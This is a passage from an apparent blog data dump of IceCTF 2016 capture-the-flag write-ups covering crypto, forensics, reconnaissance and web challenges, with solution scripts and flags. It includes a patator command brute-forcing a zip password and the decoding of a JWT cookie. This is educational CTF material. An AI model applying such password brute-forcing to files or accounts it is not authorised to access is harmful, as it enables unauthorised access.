1234567patator unzip_pass zipfile=output_Sat_Aug_20_23_01_53_2016/zip/00002585.zip password=FILE0 0=john.txt -x ignore:code!=023:22:46 patator INFO - Starting Patator v0.7-beta (https://github.com/lanjelot/patator) at 2016-08-20 23:22 CEST23:22:46 patator INFO - 23:22:46 patator INFO - code size time | candidate | num | mesg23:22:46 patator INFO - -----------------------------------------------------------------------------23:22:49 patator INFO - 0 142 0.020 | bunny | 966 | No errors detected in compressed data of /root/CTF/IceCTF/2016/65-RIP_Transmission-Forensics/output_Sat_Aug_20_23_01_53_2016/zip/00002585.zip.23:22:56 patator INFO - Hits/Done/Skip/Fail/Size: 1/3107/0/0/3107, Avg: 321 r/s, Time: 0h 0m 9s Now we have just to unzip output_Sat_Aug_20_23_01_53_2016/zip/00002585.zip with bunny as password. And display output_Sat_Aug_20_23_01_53_2016/zip/rip.jpg to get the flag: IceCTF{1_Lik3_7o_r1P_4nD_diP_411_7He_ziP5}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"http://rawsec.ml/tags/forensics/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 30 - Substituted - Cryptography","slug":"IceCTF-30-Substituted-Cryptography","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.512Z","comments":true,"path":"en/IceCTF-30-Substituted-Cryptography/","link":"","permalink":"http://rawsec.ml/en/IceCTF-30-Substituted-Cryptography/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionWe got a substitute flag, I hear they are pretty lax on the rules… crypted.txt Solution It’s a substitution cipher. I used The Black Chamber for frequence analysis. And then I continued to analyze manually with the help of my tool: 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/pythonimport sysimport stringalphabet_letters = string.ascii_letters# ciphered_text:plain_text (c:v)substitution_dict = &#123;'a':'p' ,'b':'b' ,'c':'m', 'd':'s', 'e':'o', 'f':'*', 'g':'w', 'h':'*', 'i':'k', 'j':'a', 'k':'t', 'l':'h', 'm':'n', 'n':'*', 'o':'r', 'p':'*', 'q':'g', 'r':'y', 's':'u', 't':'f', 'u':'d', 'v':'c', 'w':'i', 'x':'v', 'y':'e', 'z':'l'&#125;alphabet_substituted = \"\"for c in alphabet_letters: if c in string.ascii_lowercase: alphabet_substituted += substitution_dict[c] elif c in string.ascii_uppercase: if substitution_dict[c.lower()] is not '*': alphabet_substituted += substitution_dict[c.lower()].upper() else: alphabet_substituted += substitution_dict[c.lower()]with open(\"crypted.txt\", \"r\") as fh: encoded_data = fh.read()if (sys.version_info &gt; (3, 0)): # made with python 3.5.2 table = str.maketrans(alphabet_letters, alphabet_substituted)else: # made with python 2.7.12 table = string.maketrans(alphabet_letters, alphabet_substituted)decoded_data = encoded_data.translate(table)print(\"=== Encoded data ===\")print(encoded_data)print(\"=== Decoded data ===\")print(decoded_data) And I executed it: 12345678910111213141516171819python substitution.py=== Encoded data ===Lw!Gyzvecy ke WvyVKT!W&apos;zz by reso dsbdkwksky tzjq teo kly ujr. Teo keujr, gy joy dksurwmq bjdwv vorakeqojalr jmu wkd jaazwvjkwemd. Vorakeqojalr ljd j zemq lwdkeor, jzklesql gwkl kly juxymk et vecaskyod wk ljd qekkym oyjzzr vecazwvjkyu. Decy dwcazy ezu vwalyod joy kly Vjydjo vwalyo, kly Xwqymyoy vwalyo, kly dsbdkwkskwem vwalyo, glwvl wd klwd emy, jmu de em. Jzcedk jzz et klydy vwalyod joy yjdwzr boeiym keujr gwkl kly lyza et vecaskyod. Decy myg ymvorakwem cykleud joy JYD, kly vsooymk dkjmujou teo ymvorakwem, jzemq gwkl ODJ. Vorakeqojalr wd j xjdk twyzu jmu wd xyor wmkyoydkwmq klesql. De iwvi bjvi, oyju sa em decy veez vwalyod jmu ljxy tsm!El jmu teo reso oyveoud cr mjcy wd WvyVKT&#123;jzgjrd_zwdkym_ke_reso_dsbdkwksky_tzjqd&#125;.=== Decoded data ===Hi!Welcome to IceCTF!I&apos;ll be your substitute flag for the day. For today, we are studying basic cryptography and its applications. Cryptography has a long history, although with the advent of computers it has gotten really complicated. Some simple old ciphers are the Caesar cipher, the Vigenere cipher, the substitution cipher, which is this one, and so on. Almost all of these ciphers are easily broken today with the help of computers. Some new encryption methods are AES, the current standard for encryption, along with RSA. Cryptography is a vast field and is very interesting though. So kick back, read up on some cool ciphers and have fun!Oh and for your records my name is IceCTF&#123;always_listen_to_your_substitute_flags&#125;.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"http://rawsec.ml/tags/crypto/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 35 - IRC I - Misc","slug":"IceCTF-35-IRC-1-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.502Z","comments":true,"path":"en/IceCTF-35-IRC-1-Misc/","link":"","permalink":"http://rawsec.ml/en/IceCTF-35-IRC-1-Misc/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThere is someone sharing flags on our IRC server, can you find him and stop him? glitch.is:6667 Solution Connect to the IRC server (ex: with mibbit if you have no IRC client installed). On glitch.is home use the /list to list all the channels on the server. There is a channel named #6470e394cb_flagshare. Join it /join #6470e394cb_flagshare. Display the topic /topic which is Get your flags here! while they’re hot! IceCTF{pL3AsE_D0n7_5h4re_fL495_JUsT_doNT}. Note: Here a List of IRC commands","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/tags/misc/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 40 - Complacent - Reconnaissance","slug":"IceCTF-40-Complacent-Reconnaissance","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.535Z","comments":true,"path":"en/IceCTF-40-Complacent-Reconnaissance/","link":"","permalink":"http://rawsec.ml/en/IceCTF-40-Complacent-Reconnaissance/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThese silly bankers have gotten pretty complacent with their self signed SSL certificate. I wonder if there’s anything in there. complacent.vuln.icec.tf SolutionWith Mozilla Firefox (method 1): Go to https://complacent.vuln.icec.tf/. Accept security exceptions. Open the Inspect Element pannel. Go to the Network tab and reload. Select the main GET request. Select the Security tab. The Certificate: Organizational Unit (OU) is Flag: IceCTF{this_1nformation_wasnt_h1dd3n_at_a11}. or With Mozilla Firefox (method 2): Go to https://complacent.vuln.icec.tf/. Accept security exceptions. Click on the lock next to the URL bar. Then click on the arrow at the right of the little pop-up. Click on More Information button. Go to the Security tab. Click on the View Certificate button. Look at infos in the General tab. The Certificate: Organizational Unit (OU) is Flag: IceCTF{this_1nformation_wasnt_h1dd3n_at_a11}. PS: there is a lot of other methods","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"reconnaissance","slug":"reconnaissance","permalink":"http://rawsec.ml/tags/reconnaissance/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 15 - All your Base are belong to us - Misc","slug":"IceCTF-15-All-your-Base-are-belong-to-us-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.538Z","comments":true,"path":"en/IceCTF-15-All-your-Base-are-belong-to-us-Misc/","link":"","permalink":"http://rawsec.ml/en/IceCTF-15-All-your-Base-are-belong-to-us-Misc/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionWhat a mess… we got a raw flag but now what do we do… flag.txt Solution Look at the file: 1234567cat flag.txt01001001 01100011 01100101 01000011 01010100 01000110 01111011 01100001 01101100 00110001 0101111101101101 01111001 01011111 01100010 01100001 01110011 01100101 01110011 01011111 01100001 0111001001100101 01011111 01111001 01101111 01110101 01110010 01110011 01011111 01100001 01101110 0110010001011111 01100001 01101100 01101100 01011111 01111001 00110000 01110101 01110010 01011111 0110001001100001 01110011 01100101 01110011 01011111 01100001 01110010 01100101 01011111 01101101 0110100101101110 01100101 01111101 It’s binary, so convert it to ASCII (with a python script): 1234567with open(\"flag.txt\", \"r\") as fh: data = fh.read() bindata = \"\".join(data.split()) intdata = int(bindata, 2) strdata = intdata.to_bytes((intdata.bit_length() + 7) // 8, 'big').decode() print(strdata) We get the flag: IceCTF{al1_my_bases_are_yours_and_all_y0ur_bases_are_mine}.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/tags/misc/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 20 - Rotated! - Cryptography","slug":"IceCTF-20-Rotated-Cryptograhy","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.522Z","comments":true,"path":"en/IceCTF-20-Rotated-Cryptograhy/","link":"","permalink":"http://rawsec.ml/en/IceCTF-20-Rotated-Cryptograhy/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThey went and ROTated the flag by 5 and then ROTated it by 8! The scoundrels! Anyway once they were done this was all that was left VprPGS{jnvg_bar_cyhf_1_vf_3?} Solution A ROT13 Caesar cipher again. 5 + 8 = 13 right? Let’s use a script: 1234567891011121314151617181920212223242526#!/usr/bin/pythonimport sysimport stringdef caesar(plaintext, shift): alphabet_lower = string.ascii_lowercase alphabet_upper = string.ascii_uppercase shifted_alphabet_lower = alphabet_lower[shift:] + alphabet_lower[:shift] shifted_alphabet_upper = alphabet_upper[shift:] + alphabet_upper[:shift] alphabet = alphabet_lower + alphabet_upper shifted_alphabet = shifted_alphabet_lower + shifted_alphabet_upper if (sys.version_info &gt; (3, 0)): # made with python 3.5.2 table = str.maketrans(alphabet, shifted_alphabet) else: # made with python 2.7.12 table = string.maketrans(alphabet, shifted_alphabet) return plaintext.translate(table)rot = 'VprPGS&#123;jnvg_bar_cyhf_1_vf_3?&#125;'print(caesar(rot, 5 + 8)) Flag: IceCTF{wait_one_plus_1_is_3?}.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"http://rawsec.ml/tags/crypto/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 40 - Alien Message - Cryptography","slug":"IceCTF-40-Alien-Message-Cryptography","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.512Z","comments":true,"path":"en/IceCTF-40-Alien-Message-Cryptography/","link":"","permalink":"http://rawsec.ml/en/IceCTF-40-Alien-Message-Cryptography/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionWe found this suspicous image online and it looked like it had been planted there by an alien life form. Can you see if you can figure out what they’re trying to tell us? Solution I was pretty sure this picture contein normal text written with a special font so I began to look for alien font/code. Thanks to this article I found it was the Alienese I font from Futurama. Quote from futurama.wikia.com: The first language, a simple substitution cipher, was solved almost instantly. So I looked for decoders for a faster result: I found one here cs.oswego.edu and one here gotfuturama.com Flag: IceCTF{good_n3wz_3veryon3_1_l1k3_fu7ur4ma_4nd_th3ir_4maz1ng_3as7er_39g5} POV: This challenge? Cryptography? Really? … I deplore to still have this kind of challenge in CTF. That’s nothing but a lost of time and that have nothing to do with security. That’s even not stego because from the beginning we know that’s just a font, it’s just pain!","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"http://rawsec.ml/tags/crypto/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 40 - Search - Misc","slug":"IceCTF-40-Search-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.488Z","comments":true,"path":"en/IceCTF-40-Search-Misc/","link":"","permalink":"http://rawsec.ml/en/IceCTF-40-Search-Misc/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThere’s something about this domain… search.icec.tf, I don’t see anything, but maybe its all about the conTEXT. Solution Default behaviour of main dns lookup utilities (like nslookup or dig) is to look for A type record. But we want to look at TXT type record. So instead of using dig search.icec.tf/ (eq. dig -t A search.icec.tf/), we’ll use dig -t TXT search.icec.tf/. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162┌─[root@parrot]─[~/CTF/IceCTF/2016]└──╼ #dig -t A search.icec.tf; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Debian &lt;&lt;&gt;&gt; -t A search.icec.tf;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 21856;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;search.icec.tf. IN A;; AUTHORITY SECTION:icec.tf. 300 IN SOA bob.ns.cloudflare.com. dns.cloudflare.com. 2022260330 10000 2400 604800 3600;; Query time: 88 msec;; SERVER: 127.0.0.1#53(127.0.0.1);; WHEN: Wed Aug 17 22:45:54 CEST 2016;; MSG SIZE rcvd: 104┌─[root@parrot]─[~/CTF/IceCTF/2016]└──╼ #dig search.icec.tf; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Debian &lt;&lt;&gt;&gt; search.icec.tf;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41552;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;search.icec.tf. IN A;; Query time: 0 msec;; SERVER: 127.0.0.1#53(127.0.0.1);; WHEN: Wed Aug 17 22:46:07 CEST 2016;; MSG SIZE rcvd: 43┌─[root@parrot]─[~/CTF/IceCTF/2016]└──╼ #dig -t TXT search.icec.tf; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Debian &lt;&lt;&gt;&gt; -t TXT search.icec.tf;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 35890;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;search.icec.tf. IN TXT;; ANSWER SECTION:search.icec.tf. 300 IN TXT &quot;IceCTF&#123;flag5_all_0v3r_the_Plac3&#125;&quot;;; Query time: 61 msec;; SERVER: 127.0.0.1#53(127.0.0.1);; WHEN: Wed Aug 17 22:46:16 CEST 2016;; MSG SIZE rcvd: 88 For more details about DNS record types, see the List of DNS record types.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/tags/misc/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 45 - Hidden in Plain Sight - ReverseEngineering","slug":"IceCTF-45-Hidden-in-Plain-Sight-ReverseEngineering","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.542Z","comments":true,"path":"en/IceCTF-45-Hidden-in-Plain-Sight-ReverseEngineering/","link":"","permalink":"http://rawsec.ml/en/IceCTF-45-Hidden-in-Plain-Sight-ReverseEngineering/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionMake sure you take a real close look at it, it should be right there! /home/plain_sight/ or download it here SolutionOpen this binary with an hex editor (ex: ht, xxd, hexeditor, bless, wxHexEditor by preference order)1234500000510: ec0c 50e8 38fe ffff 83c4 10b0 49b0 63b0 ..P.8.......I.c.00000520: 65b0 43b0 54b0 46b0 7bb0 6cb0 6fb0 6fb0 e.C.T.F.&#123;.l.o.o.00000530: 6bb0 5fb0 6db0 6fb0 6db0 5fb0 49b0 5fb0 k._.m.o.m._.I._.00000540: 66b0 6fb0 75b0 6eb0 64b0 5fb0 69b0 74b0 f.o.u.n.d._.i.t.00000550: 7dc7 45f4 0000 0000 eb2f 83ec 0c6a 01e8 &#125;.E....../...j..","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"reverse","slug":"reverse","permalink":"http://rawsec.ml/tags/reverse/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 45 - Time Traveler - Forensics","slug":"IceCTF-45-Time-Traveler-Forencics","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.532Z","comments":true,"path":"en/IceCTF-45-Time-Traveler-Forencics/","link":"","permalink":"http://rawsec.ml/en/IceCTF-45-Time-Traveler-Forencics/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionI can assure you that the flag was on this website at some point in time. Solution Use the WaybackMachine of Internet Archive. Enter the URL http://time-traveler.icec.tf/. Select the save point and get the flag: IceCTF{Th3y&#39;11_n3v4r_f1|\\|d_m4h_fl3g_1n_th3_p45t}. Similar challenge: ABCTF - 50 - Archive Me - Reconaissance POV: I think it’s more a Reconaissance challenge than a Forensics one. But you know challenge classification in CTF…","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"http://rawsec.ml/tags/forensics/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 45 - Toke - Web","slug":"IceCTF-45-Toke-Web","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.505Z","comments":true,"path":"en/IceCTF-45-Toke-Web/","link":"","permalink":"http://rawsec.ml/en/IceCTF-45-Toke-Web/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionI have a feeling they were pretty high when they made this website… Solution Register a user an login with it. With your browser network analyser loot at cookies in response header of the HTTP request: Set-Cookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiSWNlQ1RGe2pXN190MEszbnNfNFJlX25PX3AxNENFX2ZPUl81M0NyRTdTfSIsInVzZXIiOiJhemEifQ.Zfl286kFvhPrNJG-dtoTjbPU7OxlUdTW_XKEL679uU0;. JWT stands for JSON Web Tokens and is composed of 3 parts: Part1: Header, is base64 encoded, show hash algorithm. Part2: Payload, base64 encoded, content. Part3: Signature, signature, concatenation of header + content and then encoded with the hash algorithm contained in the header. So eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiSWNlQ1RGe2pXN190MEszbnNfNFJlX25PX3AxNENFX2ZPUl81M0NyRTdTfSIsInVzZXIiOiJhemEifQ.Zfl286kFvhPrNJG-dtoTjbPU7OxlUdTW_XKEL679uU0 match with header.payload.signature. So we get:12345printf &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&quot; | base64 -d&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;printf &quot;eyJmbGFnIjoiSWNlQ1RGe2pXN190MEszbnNfNFJlX25PX3AxNENFX2ZPUl81M0NyRTdTfSIsInVzZXIiOiJhemEifQ&quot; | base64 -d&#123;&quot;flag&quot;:&quot;IceCTF&#123;jW7_t0K3ns_4Re_nO_p14CE_fOR_53CrE7S&#125;&quot;,&quot;user&quot;:&quot;aza&quot;&#125; An introduction to JSON Web Tokens is available here.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 50 - Corrupt Transmission - Forensics","slug":"IceCTF-50-Corrupt-Tansmission-Forencics","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.525Z","comments":true,"path":"en/IceCTF-50-Corrupt-Tansmission-Forencics/","link":"","permalink":"http://rawsec.ml/en/IceCTF-50-Corrupt-Tansmission-Forencics/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionWe intercepted this image, but it must have gotten corrupted during the transmission. Can you try and fix it? corrupt.png Solution Check the file type: 12file corrupt.pngcorrupt.png: data This PNG is clearly corrupted, check what’s wrong: 123456789pngcheck corrupt.pngcorrupt.png: CORRUPTED by text conversionERROR: corrupt.pngpngcheck -v corrupt.pngFile: corrupt.png (469363 bytes) File is CORRUPTED. It seems to have suffered EOL conversion. It was probably transmitted in text mode.ERRORS DETECTED in corrupt.png This kind of error may occurs when an image (binary) was downloaded as ASCII text. First, we’ll check the PNG header with xxd: 12xxd -l8 corrupt.png00000000: 9050 4e47 0e1a 0a1b .PNG.... PNG spec tell us that not the right header, good header should be: 123(decimal) 137 80 78 71 13 10 26 10(hexadecimal) 89 50 4e 47 0d 0a 1a 0a(ASCII C notation) \\211 P N G \\r \\n \\032 \\n Let’s fix it with HT hex editor. Now it sounds right: 123456xxd -l8 corrupt.png.fix00000000: 8950 4e47 0d0a 1a0a .PNG....pngcheck corrupt.png.fixcorrupt.png.fix additional data after IEND chunkERROR: corrupt.png.fix There is still an error but now PNG is recognized and we can display the image: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475file corrupt.png.fixcorrupt.png.fix: PNG image data, 500 x 408, 8-bit/color RGBA, non-interlacedpngcheck -v corrupt.png.fixFile: corrupt.png.fix (469363 bytes) chunk IHDR at offset 0x0000c, length 13 500 x 408 image, 32-bit RGB+alpha, non-interlaced chunk bKGD at offset 0x00025, length 6 red = 0x00ff, green = 0x00ff, blue = 0x00ff chunk pHYs at offset 0x00037, length 9: 2835x2835 pixels/meter (72 dpi) chunk tIME at offset 0x0004c, length 7: 20 Jun 2016 03:20:08 UTC chunk IDAT at offset 0x0005f, length 8192 zlib: deflated, 32K window, maximum compression chunk IDAT at offset 0x0206b, length 8192 chunk IDAT at offset 0x04077, length 8192 chunk IDAT at offset 0x06083, length 8192 chunk IDAT at offset 0x0808f, length 8192 chunk IDAT at offset 0x0a09b, length 8192 chunk IDAT at offset 0x0c0a7, length 8192 chunk IDAT at offset 0x0e0b3, length 8192 chunk IDAT at offset 0x100bf, length 8192 chunk IDAT at offset 0x120cb, length 8192 chunk IDAT at offset 0x140d7, length 8192 chunk IDAT at offset 0x160e3, length 8192 chunk IDAT at offset 0x180ef, length 8192 chunk IDAT at offset 0x1a0fb, length 8192 chunk IDAT at offset 0x1c107, length 8192 chunk IDAT at offset 0x1e113, length 8192 chunk IDAT at offset 0x2011f, length 8192 chunk IDAT at offset 0x2212b, length 8192 chunk IDAT at offset 0x24137, length 8192 chunk IDAT at offset 0x26143, length 8192 chunk IDAT at offset 0x2814f, length 8192 chunk IDAT at offset 0x2a15b, length 8192 chunk IDAT at offset 0x2c167, length 8192 chunk IDAT at offset 0x2e173, length 8192 chunk IDAT at offset 0x3017f, length 8192 chunk IDAT at offset 0x3218b, length 8192 chunk IDAT at offset 0x34197, length 8192 chunk IDAT at offset 0x361a3, length 8192 chunk IDAT at offset 0x381af, length 8192 chunk IDAT at offset 0x3a1bb, length 8192 chunk IDAT at offset 0x3c1c7, length 8192 chunk IDAT at offset 0x3e1d3, length 8192 chunk IDAT at offset 0x401df, length 8192 chunk IDAT at offset 0x421eb, length 8192 chunk IDAT at offset 0x441f7, length 8192 chunk IDAT at offset 0x46203, length 8192 chunk IDAT at offset 0x4820f, length 8192 chunk IDAT at offset 0x4a21b, length 8192 chunk IDAT at offset 0x4c227, length 8192 chunk IDAT at offset 0x4e233, length 8192 chunk IDAT at offset 0x5023f, length 8192 chunk IDAT at offset 0x5224b, length 8192 chunk IDAT at offset 0x54257, length 8192 chunk IDAT at offset 0x56263, 